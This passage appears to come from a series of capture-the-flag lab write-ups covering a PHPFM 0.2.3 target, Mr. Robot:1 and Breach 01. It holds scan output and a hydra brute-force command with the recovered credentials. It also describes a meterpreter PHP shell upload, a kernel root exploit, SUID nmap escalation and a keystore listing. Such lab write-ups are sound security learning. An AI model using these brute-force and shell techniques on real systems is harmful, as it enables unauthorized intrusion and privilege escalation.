+ http://192.168.1.3/commodore64/incl/.phtml (CODE:403|SIZE:309)                                                                                                                                                                 
                                                                                                                                                                                                                                 
---- Entering directory: http://192.168.1.3/commodore64/lang/ ----
+ http://192.168.1.3/commodore64/lang// (CODE:403|SIZE:304)                                                                                                                                                                      
+ http://192.168.1.3/commodore64/lang/.php (CODE:403|SIZE:307)                                                                                                                                                                   
+ http://192.168.1.3/commodore64/lang/.phtml (CODE:403|SIZE:309) 
```
Using curl on the login page
```
curl http://192.168.1.3/commodore64/index.php 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><title>PHPFM 0.2.3 - a file manager written in PHP</title><link rel='stylesheet' href='incl/phpfm.css' type='text/css'></head><body link='#0000FF' alink='#0000FF' vlink='#0000FF' bgcolor='#FFFFFF'><center><table class='top' cellpadding=0 cellspacing=0><tr><td align='center'><font class='headline'>PHPFM 0.2.3</font></td></tr></table><br /><table class='index' width=500 cellpadding=0 cellspacing=0><tr><td class='iheadline' align='center' height=21><font class='iheadline'>Login system:</font></td></tr><tr><td valign='top'><center><br />Please input your username and password below:<br /><form action='/commodore64/index.php' method='post' enctype='multipart/form-data'><table class='upload'><tr><td>Username:</td><td><input name='input_username' size=20></td></tr><tr><td>Password:</td><td><input type='password' name='input_password' size=20></td></tr><tr><td>&nbsp;</td><td><input class='button' type='submit' value='Log in'></td></tr></table><input type='hidden' name=path value=""></form><br /><br /></center></td></tr></table><br /><br /><table class='bottom' cellpadding=0 cellspacing=0><tr><td align='center'>Powered by <a href='http://phpfm.zalon.dk/' target='_new' class='bottom'>PHPFM</a> 0.2.3</td></tr><tr><td align='center'>Copyright � 2002 Morten Bojsen-Hansen</td></tr><tr><td>&nbsp;</td></tr><tr><td align='center'><a href='http://validator.w3.org/check/referer'><img border='0' src='icon/valid-html401.jpg' alt='Valid HTML 4.01!' height='31' width='88'></a><a href='http://jigsaw.w3.org/css-validator/'><img style='border:0;width:88px;height:31px' src='icon/valid-css.jpg' alt='Valid CSS!'></a></td></tr><tr><td>&nbsp;</td></tr><tr><td align='center'>This page was produced in 0.0002 seconds.</td></tr></table><br /><br /></center></body></html>
```
If we see, there are three fields, input_username,input_password and path, using hydra to bruteforce, do read hydra documentation on http-post-form
```
hydra -l robhubbard -P pass.txt 192.168.1.3 http-post-form "/commodore64/index.php:input_username=^USER^&input_password=^PASS^&path=:login"
[80][http-post-form] host: 192.168.1.3   login: robhubbard   password: mos6518
```
we have the username and password, we can login to the PHPFM 0.2.3.

Once, logged in, we can upload php meterpreter shell generated using msfvenom. Once login, the uname is 
```
Linux sidney 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```
and os-release is
```
www-data@sidney:/var/www/html/commodore64$ cat /etc/os-release
cat /etc/os-release
NAME="Ubuntu"
VERSION="16.04 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
UBUNTU_CODENAME=xenial
```
This version of ubuntu is affected by doubleput vulnerability Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit. Also, the user rhubbard uses the same password and have the sudo privileges to run all.
</li>
<li>Mr. Robot:1:

It was quite easy, you get first key out of the three key from the robots.txt file. Also, the login, password could be found from the nikto results. Once logged in, execute a php shell. In the home directory of robot, we will get the md5 sum of the password. Login using that and search for the suid files. Nmap is suid, which can be used for privilege escalation.</li>
<li>Breach 01:
We find a email which specifies .keystore file which is a Java keystore file. more details about the java keystore file can be found on digital ocean blog https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores 

```
keytool -list -keystore .keystore
Enter keystore password:  

Keystore type: JKS
Keystore provider: SUN

Your keystore contains 1 entry

tomcat, 20 May, 2016, PrivateKeyEntry, 
Certificate fingerprint (SHA1): D5:D2:49:C3:69:93:CC:E5:39:A9:DE:5C:91:DC:F1:26:A6:40:46:53
```</li>
</ol>
